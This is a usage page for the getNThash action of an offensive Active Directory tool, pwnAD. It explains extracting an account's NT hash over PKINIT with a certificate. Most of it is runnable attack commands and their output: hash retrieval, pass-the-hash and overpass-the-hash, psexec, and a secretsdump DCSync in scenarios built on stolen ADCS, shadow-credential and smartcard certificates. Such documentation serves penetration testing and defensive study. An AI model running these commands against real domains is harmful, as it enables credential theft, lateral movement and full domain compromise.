# getNThash

Retrieve the NT hash for an account using PKINIT.

## Usage

```bash
pwnAD [auth options] getNThash
```

## Description

The `getNThash` action uses PKINIT (certificate-based Kerberos authentication) to obtain a TGT and then extracts the NT hash from the PAC_CREDENTIAL_INFO structure. This is useful when you have a certificate for an account but need the NT hash for other attacks.

## Requirements

- Valid certificate for the target user
- Domain supports PKINIT
- Windows Server 2016+ domain functional level

## Authentication Methods

| Method | Flags | Description |
|--------|-------|-------------|
| Certificate (PFX) | `-pfx` | PKCS#12 file containing cert and key |
| Certificate (PEM) | `-cert -key` | Separate certificate and key files |

!!! note
    This action **requires** certificate authentication. Password/hash authentication will not return the NT hash through this method.

## Examples

### Using PFX File

```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -pfx admin.pfx getNThash
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for administrator
[*] Got NThash for administrator: 31d6cfe0d16ae931b73c59d7e0c089c0
```

### Using PFX with Password

```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -pfx admin.pfx -pfx-pass 'PfxPassword!' getNThash
[*] Got NThash for administrator: 31d6cfe0d16ae931b73c59d7e0c089c0
```

### Using Separate Cert and Key

```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -cert admin.crt -key admin.key getNThash
[*] Got NThash for administrator: 31d6cfe0d16ae931b73c59d7e0c089c0
```

## Interactive Mode

```bash
pwnAD -i --dc-ip 192.168.1.10 -d domain.local -u administrator -pfx admin.pfx

pwnAD [u:DOMAIN\administrator]> getNThash
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for administrator
[*] Got NThash for administrator: 31d6cfe0d16ae931b73c59d7e0c089c0
```

## Using the NT Hash

Once you have the NT hash, use it for:

### Pass-the-Hash

```bash
# pwnAD
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -H ':31d6cfe0d16ae931b73c59d7e0c089c0' get users

# Impacket
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 domain.local/administrator@192.168.1.10
psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 domain.local/administrator@192.168.1.10
```

### Overpass-the-Hash

```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -H ':31d6cfe0d16ae931b73c59d7e0c089c0' getTGT
```

## Output

In addition to displaying the NT hash, this action also:

- Saves the TGT to `<username>.ccache`

## Technical Details

### PAC_CREDENTIAL_INFO

When using PKINIT:

1. Client authenticates using certificate (AS-REQ with PA-PK-AS-REQ)
2. KDC includes PAC_CREDENTIAL_INFO in the AS-REP
3. PAC_CREDENTIAL_INFO contains NTLM credentials encrypted with the session key
4. Client decrypts to obtain NT hash

This only works with PKINIT because the KDC includes the credential info to support NTLM fallback for the authenticated user.

## Attack Scenarios

### Scenario 1: ADCS Certificate Theft

After compromising a certificate through ADCS attacks (ESC1-8):

```bash
# Certificate obtained via Certipy or similar
pwnAD --dc-ip 192.168.1.10 -d domain.local -u administrator -pfx stolen_cert.pfx getNThash
[*] Got NThash for administrator: aabbccdd...

# Use hash for DCSync
secretsdump.py -hashes :aabbccdd... domain.local/administrator@192.168.1.10 -just-dc-ntlm
```

### Scenario 2: Shadow Credentials Follow-up

After using the `shadow auto` command, you already have the hash. But if you kept the certificate:

```bash
# If you have the certificate from shadow add
pwnAD --dc-ip 192.168.1.10 -d domain.local -u targetuser -pfx targetuser.pfx getNThash
```

### Scenario 3: Smartcard User Compromise

If you compromise a user's smartcard certificate:

```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u smartcard_user -pfx exported_cert.pfx getNThash
```

## Troubleshooting

### "KDC_ERR_PADATA_TYPE_NOSUPP"

The KDC doesn't support PKINIT. This typically means:

- No Certificate Authority is deployed
- PKINIT is disabled
- Domain functional level is too low

### "Certificate validation failed"

The certificate is:

- Expired
- Revoked
- Not trusted by the DC
- Wrong certificate for the user

### "No NT hash in PAC_CREDENTIAL_INFO"

The KDC didn't include credentials in the response. This can happen if:

- The account doesn't have NTLM credentials stored
- Protected Users group membership

## References

- [PKINITtools by Dirk-jan](https://github.com/dirkjanm/PKINITtools)
- [MS-KILE: PAC_CREDENTIAL_INFO](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/)
